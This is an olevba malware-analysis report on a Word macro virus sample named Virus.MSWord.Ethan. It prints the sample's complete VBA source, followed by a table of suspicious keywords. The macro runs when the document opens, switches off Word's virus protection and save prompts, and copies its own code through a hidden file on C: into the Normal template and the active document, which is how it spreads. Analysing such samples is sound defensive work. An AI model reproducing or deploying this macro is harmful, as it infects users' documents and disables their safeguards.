olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.du-7e2dad4d2c3d193e92d157046c13908b97d1a0d1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.du-7e2dad4d2c3d193e92d157046c13908b97d1a0d1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next 'D
s = "c:\Ýòàí.den"
Application.EnableCancelKey = Not -1
With Options:
.ConfirmConversions = 0
.SaveNormalPrompt = 0
.VirusProtection = 0
End With
If Dir(s, 6) = "" Then
Open s For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).Codemodule.CountOfLines
Print #1, MacroContainer.VBProject.VBComponents.Item(1).Codemodule.Lines(i, 1)
Next i
Close #1
SetAttr s, 6
End If
If NormalTemplate.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then D NormalTemplate.VBProject.VBComponents.Item(1), s
If ActiveDocument.VBProject.VBComponents.Item(1).Codemodule.Lines(2, 1) <> "On Error Resume Next 'D" Then
D ActiveDocument.VBProject.VBComponents.Item(1), s
ActiveDocument.Save
End If
Randomize
If Rnd < 0.3 Then MsgBox "=============ÁÏÒÊ============="
End Sub
Sub D(t, s)
t.Codemodule.DeleteLines 1, t.Codemodule.CountOfLines
Open s For Input As #1
i = 1
If LOF(1) <> 0 Then
Do While Not EOF(1)
Line Input #1, a
t.Codemodule.InsertLines i, a
i = i + 1
Loop
End If
Close #1
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
